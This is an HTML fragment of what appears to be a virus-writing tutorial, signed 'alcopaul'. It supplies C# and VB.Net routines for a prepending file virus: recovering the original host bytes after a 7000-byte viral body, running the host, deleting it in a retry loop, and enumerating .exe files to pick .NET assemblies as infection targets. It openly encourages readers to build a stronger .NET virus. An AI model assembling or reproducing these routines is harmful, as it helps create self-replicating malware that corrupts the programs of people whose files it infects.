+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>VB.Net</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>imports </B><B>System.IO</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[....]</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim host &nbsp;as integer</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim fs1 = New FileStream(&quot;file.exe&quot;, FileMode.Open, FileAccess.Read)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>host = fs1.Length</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[.....]</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>or</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>imports Microsoft.VisualBasic</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[....]</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>dim host as long</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>host = FileLen(&quot;file.exe&quot;)</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[....]</B></FONT><BR>
+<bR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>====</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>seek</B></FONT><BR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>====</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>filehere is infected with your prepending virus with a size of 7000 and you wanna extract the original contents of filehere..</B></FONT><BR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>original filehere bytes will be stored in bytes1</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>C#</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>using System.IO</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[....]</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;FileStream fs1 = new FileStream(&quot;filehere&quot;, FileMode.OpenOrCreate, FileAccess.Read);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;BinaryReader r1 = new BinaryReader(fs1);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;int host = (int) fs1.Length;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;int vir = host - 7000;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;r1.BaseStream.Seek(7000, SeekOrigin.Begin);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;byte[] bytes1 = new byte[vir];</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;int numBytesToRead = vir;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;int numBytesRead = 0;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;while (numBytesToRead &gt; 0)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;{</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;int n = r1.Read(bytes1, numBytesRead, numBytesToRead);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;if (n==0)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;break;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;numBytesRead += n;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;numBytesToRead -= n;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;}</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;r1.Close();</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[....]</B></FONT><BR>
+<bR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>VB.Net</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[.....]</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim fs1 = New FileStream(&quot;filehere&quot;, FileMode.Open, FileAccess.Read)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim r1 As New BinaryReader(fs1)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>hostlen1 = fs1.Length - 7000</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>r1.BaseStream.Seek(7000, SeekOrigin.Begin)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim bytes1(hostlen1) As Byte</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim numBytesToRead1 As Integer = CInt(hostlen1)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim numBytesRead1 As Integer = 0</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>While numBytesToRead1 &gt; 0</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Dim n1 As Integer = r1.Read(bytes1, numBytesRead1, numBytesToRead1)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>If n1 = 0 Then ' We're at EOF</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Exit While</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End If</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>numBytesRead1 += n1</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>numBytesToRead1 -= n1</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End While</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>r1.Close()</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[.....]</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>=======</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>execute</B></FONT><BR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>=======</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>use system.diagnostics.process.start or call unmanaged ShellExecute API to execute a file from c# and shell to execute a file from vb.net</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>==========</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>delete host</B></FONT><BR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>==========</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>assuming that host.exe is still running or active in the memory.. the routines below will wait for host.exe to terminate and if the host is terminated, it will</B></FONT><BR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>be deleted.. uses Managed SEH..</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>C#</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>using System.IO;</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[.....]</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;wet:</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;File.Delete(&quot;host.exe&quot;);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto wet;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (File.Exists(&quot;host.exe&quot;)==true)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto wet;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[.......]</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>VB.Net</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>imports System.IO</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[.......]</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>wet:</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>try</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>File.Delete(&quot;host.exe&quot;)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>catch</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>goto wet</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>end try</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>if (File.Exists(&quot;host.exe&quot;) = true)</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>goto wet</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>end if</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[.......]</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>===========</B></FONT><BR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>dot net files?</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>===========</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>yeah, your virus was written in a dotnet language.. you only know how to infect *.exe, regardless of it's content.... an unripe dotnet virus...</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>donut virus by benny was called a dotnet virus (twas a win32pe file virus, avs) coz it only infects dotnet files...</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>now, your msil virus can segregate msil from not with this c# routine...</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>a dotnet virus infecting dotnet files in action...</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>C#</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>using System.Reflection;</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>using System.IO</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[.....]</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;string[] files = Directory.GetFiles(Directory.GetCurrentDirectory(), &quot;*.exe&quot;);</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;foreach (string file in files){</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;try</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;{</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;AssemblyName.GetAssemblyName(file); // !!!! check if msil :: on error goto next file</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;// your routine here i.e. examine file file for signature</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;}</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;catch</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;{</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;continue; // dotnot file.. next file</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;}</B></FONT><BR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;}</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[.....]</B></FONT><BR>
+<FONT SIZE="3" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>pieces of a jigsaw puzzle ei... with this and with the help of some more readings, you can make a more superior dotnet virus than flatei or veebeep...</B></FONT><BR>
+<bR>
+<FONT SIZE="3" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>it is all in the dotnet framework sdk documentation......</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>ps : look at System.Reflection.. it is an interesting namespace.. is that the missing link for the true IL virus?...</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#DDDDDD" FACE="Arial,Helvetica,sans-serif"><B>alcopaul</B></FONT><BR>
+<bR>
+</Td>
+<Td ALIGN="LEFT" WIDTH="10" VALIGN = "top" ><IMG BORDER="0" SRC="1x1.gif" HEIGHT="1" ALIGN="bottom" WIDTH="10" HSPACE="0" VSPACE="0"></Td>
+ </Tr>
+ <Tr>
+  <Td WIDTH="10" HEIGHT="1"></Td>  <Td><FONT SIZE="1"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</FONT></Td>  <Td WIDTH="10" ></Td>
+ </Tr>
+</TABLE>
+</BODY>
+</HTML>
